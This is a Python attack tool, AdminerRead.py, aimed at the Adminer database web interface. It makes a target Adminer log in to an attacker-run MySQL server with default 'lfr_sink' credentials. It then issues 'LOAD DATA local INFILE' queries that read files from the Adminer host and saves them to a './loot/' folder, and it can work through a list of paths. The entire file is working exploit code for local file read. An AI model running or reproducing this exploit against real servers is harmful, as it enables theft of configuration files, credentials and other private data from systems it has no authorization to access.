#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# File name          : AdminerRead.py
# Authors            : Podalirius (@podalirius_)

import argparse
import urllib
from bs4 import BeautifulSoup
import json
import os
import requests
from rich.table import Table
from rich.console import Console
from rich.progress import track

VERSION = "v1.1.0"

class Adminer(object):
    """docstring for Adminer."""

    def __init__(self, url, verbose=False):
        super(Adminer, self).__init__()
        self.url = url
        self.verbose = verbose
        self.session = requests.Session()
        self.connected = False
        self.data = {"driver": "", "server": "", "username": "", "password": "", "database": ""}
        self.available_drivers = self.get_available_drivers()
        self.version = self.get_version()

    def get_available_drivers(self):
        """Documentation for get_available_drivers"""
        r = self.session.get(self.url)
        soup = BeautifulSoup(r.content.decode("UTF-8"),"lxml")
        self.available_drivers = [{"name":o['value'],"value":o.text} for o in soup.find("select",attrs={"name":"auth[driver]"}).findAll("option")]
        #
        self.debug("get_available_drivers(...)")
        for a in self.available_drivers:
            self.debug("  | driver : %s" % a["name"])
        return self.available_drivers

    def get_version(self):
        """Documentation for get_version"""
        r = self.session.get(self.url)
        soup = BeautifulSoup(r.content.decode("UTF-8"),"lxml")
        span_version = soup.find("span",attrs={"class":"version"})
        self.version = (span_version.text if span_version != None else None)
        self.debug("get_version(...)")
        self.debug("  | version : %s" % self.version)
        print("[>] Remote Adminer version : v%s\n" % self.version)
        return self.version

    def connect(self, server, username, password, database, driver=""):
        """Documentation for connect"""
        self.data = {
            "driver": driver, "server": server, "username": username,
            "password": password, "database": database
        }

        self.debug("connect(...)")
        self.debug("  | driver   : %s" % self.data['driver'])
        self.debug("  | server   : %s" % self.data['server'])
        self.debug("  | username : %s" % self.data['username'])
        self.debug("  | password : %s" % self.data['password'])
        self.debug("  | database : %s" % self.data['database'])

        r = self.session.post(
            self.url,
            data={
                "auth[driver]": self.data["driver"],
                "auth[server]": self.data["server"],
                "auth[username]": self.data["username"],
                "auth[password]": self.data["password"],
                "auth[db]": self.data["database"]
            },
            allow_redirects=True
        )
        if b"<p class=\"logout\">" in r.content:
            self.connected = True
        elif b"<div class='error'>" in r.content:
            soup = BeautifulSoup(r.content.decode("UTF-8"),"lxml")
            error_messages = [e.text.strip() for e in soup.findAll("div",attrs={"class":"error"})]
            for e in error_messages:
                print("\x1b[91m[!]",e,"\x1b[0m")
            self.connected = False
        return self.connected

    def execute_sql_query(self, sql_query):
        self.debug("execute_sql_query(...)")
        self.debug("  | sql_query  : %s" % sql_query)
        query_results = []
        data = {"results":query_results, "messages":[], "errors":[], "success":False}
        if self.connected:
            # Retreive the token
            r = self.session.get(self.url+"?server=%s&username=%s&db=%s&sql=%s" % (
                self.data["server"],
                self.data["username"],
                self.data["database"],
                urllib.parse.quote(sql_query)
            ))
            soup = BeautifulSoup(r.content.decode("UTF-8"),"lxml")
            token = soup.find("form").find("input",attrs={"name":"token"})["value"]
            self.debug("  | token      : %s" % token)
            # Execute query
            r = self.session.post(
                self.url + '?server=%s&username=%s&db=%s&sql=%s' % (
                    self.data['server'],
                    self.data['username'],
                    self.data['database'],
                    urllib.parse.quote(sql_query)
                ),
                data = {
                    "query" : sql_query,
                    "limit" : "",
                    "token" : token
                }
            )
            soup = BeautifulSoup(r.content.decode('UTF-8'),'lxml')
            # <table class="nowrap" cellspacing="0">
            tables_of_results = soup.findAll('table',attrs={'class':'nowrap','cellspacing':'0'})

            for table in tables_of_results:
                fields = [th.text for th in table.findAll('th')]
                num_rows = len([tr for tr in table.findAll('tr') if len(tr.findAll('td')) != 0])
                tmpdata = {
                    'num_rows': num_rows,
                    'fields': fields,
                    'values': {
                        fields[k]:[
                            tr.findAll('td')[k].text for tr in table.findAll('tr') if len(tr.findAll('td')) != 0
                        ] for k in range(len(fields))
                    }
                }
                query_results.append(tmpdata)
            # Debug print tables
            if self.verbose:
                for result_table in query_results:
                    self.debug(json.dumps(result_table))
                    table = Table()
                    for field in result_table['fields']:
                        table.add_column(field, justify="left", style="bright_yellow", no_wrap=True)
                    for num_row in range(result_table['num_rows']):
                        table.add_row(*(
                            result_table['values'][field][num_row]
                            for field in result_table['fields']
                        ))
                    console = Console()
                    console.print(table)
            data['success'] = True
            # Parse output
            if b"<p class='message'>" in r.content:
                data['success'] = False
                soup = BeautifulSoup(r.content.decode('UTF-8'),'lxml')
                error_messages = [e.text.strip() for e in soup.findAll('p',attrs={'class':'message'})]
                for e in error_messages:
                    data['messages'].append(e)
                    self.debug("\x1b[92m Message: %s\x1b[0m" % e)
            if b"<p class='error'>" in r.content:
                data['success'] = False
                soup = BeautifulSoup(r.content.decode('UTF-8'),'lxml')
                error_messages = [e.text.strip() for e in soup.findAll('p',attrs={'class':'error'})]
                for e in error_messages:
                    self.debug("\x1b[91m Error: %s\x1b[0m" % e)
                    data['errors'].append(e)
        self.debug(data)
        return data

    def exploit_lfr(self, pathtofile, target_table):
        self.debug("exploit_lfr(...)")
        self.debug("  | pathtofile : %s" % pathtofile)
        filecontent = []
        if self.connected:
            sql_query = """TRUNCATE TABLE %s; LOAD DATA local INFILE '%s' INTO TABLE %s fields TERMINATED BY "\\n";""" % (target_table, pathtofile,target_table)
            if self.execute_sql_query(sql_query)['success'] == True:
                results = self.execute_sql_query("SELECT * FROM lfr_sink_table;")['results'][0]
                size_columns, size_rows = len(results['fields']), len(results['values'][results['fields'][0]])
                total_size = size_columns * size_rows
                for k in range(total_size):
                    current_field = results['fields'][k % size_columns]
                    line = results['values'][current_field][k % size_rows]
                    filecontent.append(line)
                return {"path":pathtofile, "content":filecontent, "success": True}
            else:
                # File does not exist or SQL Error
                return {"path":pathtofile, "content":filecontent, "success": False}
        else:
            return {"path":pathtofile, "content":filecontent, "success": False}

    def debug(self, msg):
        """Documentation for debug"""
        if self.verbose == True:
            print("[%s] %s" % ("Adminer", msg))
        return

    def __repr__(self):
        return "<Adminer on '%s' targeting host='%s' username='%s' db='%s'>" % (
            self.url,
            self.data['server'],
            self.data['username'],
            self.data['database']
        )

def header():
    print(r"""     _       _           _                 ____                _
    / \   __| |_ __ ___ (_)_ __   ___ _ __|  _ \ ___  __ _  __| |
   / _ \ / _` | '_ ` _ \| | '_ \ / _ \ '__| |_) / _ \/ _` |/ _` |
  / ___ \ (_| | | | | | | | | | |  __/ |  |  _ <  __/ (_| | (_| |
 /_/   \_\__,_|_| |_| |_|_|_| |_|\___|_|  |_| \_\___|\__,_|\__,_|   %s
                                                                 """ % VERSION)
    return

def parse_options():
    header()
    description = ""
    parser = argparse.ArgumentParser(
        description=description,
        formatter_class=argparse.RawTextHelpFormatter,
    )
    parser.add_argument("-v", "--verbose", dest="verbose", action="store_true", default=False, help="Verbose mode")
    parser.add_argument("-s", "--only-success", dest="only_success", action="store_true", default=False, help="Only print successful read file attempts.")
    parser.add_argument("-t", "--target", dest="target_url", action="store", type=str, required=True, help="URL of the Adminer to connect to.")

    files_source = parser.add_mutually_exclusive_group()
    files_source.add_argument("-f", "--file", dest="file", action="store", type=str, help="Remote file to read.")
    files_source.add_argument("-F", "--filelist", dest="filelist", action="store", type=str, help="File containing a list of paths to files to read remotely.")

    parser.add_argument("-I", "--db-ip", dest="db_ip", action="store", type=str, required=True, help="Remote database IP where the Adminer will connect to.")
    parser.add_argument("-P", "--db-port", dest="db_port", action="store", type=int, default=3306, required=False, help="Remote database port where the Adminer will connect to.")

    parser.add_argument(
        "-u", "--db-username",
        dest="db_username",
        action="store",
        type=str,
        default="lfr_sink_user",
        required=False,
        help="Remote database username."
    )
    parser.add_argument(
        "-p", "--db-password",
        dest="db_password",
        action="store",
        type=str,
        default="lfr_sink_password",
        required=False,
        help="Remote database password."
    )
    parser.add_argument(
        "-D", "--dump-dir",
        dest="dump_dir",
        action="store",
        type=str,
        default="./loot/",
        required=False,
        help="Directory where the dumped files will be stored."
    )

    parser.add_argument(
        "-k", "--insecure",
        dest="insecure_tls",
        action="store_true",
        default=False,
        help="Allow insecure server connections when using SSL (default: False)"
    )

    options = parser.parse_args()
    return options

def dump_file(adminer, basepath, filepath, table="lfr_sink_table", only_success=False):
    def b_filesize(file):
        l = len('\n'.join(file['content']))
        units = ['B','kB','MB','GB','TB','PB']
        for k in range(len(units)):
            if l < (1024**(k+1)):
                break
        return "%4.2f %s" % (round(l/(1024**(k)),2), units[k])
    #
    file = adminer.exploit_lfr(filepath, table)
    if file['success'] == True:
        print('\x1b[92m[+] (%9s) %s\x1b[0m' % (b_filesize(file), filepath))
        dir = basepath + os.path.dirname(file['path'])
        if not os.path.exists(dir):
            os.makedirs(dir, exist_ok=True)
        f = open(basepath+file['path'],"w")
        for line in file['content']:
            f.write(line+"\n")
        f.close()
        return True
    else:
        if only_success != True:
            print('\x1b[91m[!] (%s) %s\x1b[0m' % ("==error==",filepath))
        return False

if __name__ == '__main__':
    options = parse_options()

    if options.insecure_tls:
        # Disable warings of insecure connection for invalid certificates
        requests.packages.urllib3.disable_warnings()
        # Allow use of deprecated and weak cipher methods
        requests.packages.urllib3.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        try:
            requests.packages.urllib3.contrib.pyopenssl.util.ssl_.DEFAULT_CIPHERS += ':HIGH:!DH:!aNULL'
        except AttributeError:
            pass

    adminer = Adminer(options.target_url, verbose=options.verbose)
    adminer.connect(
        options.db_ip,
        options.db_username,
        options.db_password,
        "lfr_sink_db",
        driver="server"
    )
    if options.filelist:
        if os.path.exists(options.filelist):
            f = open(options.filelist, 'r')
            list_of_files = [l.strip() for l in f.readlines() if len(l.strip()) != 0]
            f.close()
            for file in track(list_of_files):
                dump_file(adminer, options.dump_dir, file, only_success=options.only_success)
        else:
            print('\x1b[91m[!] Cannot read file %s\x1b[0m' % (options.filelist))
    elif options.file:
        dump_file(adminer, options.dump_dir, options.file, only_success=options.only_success)
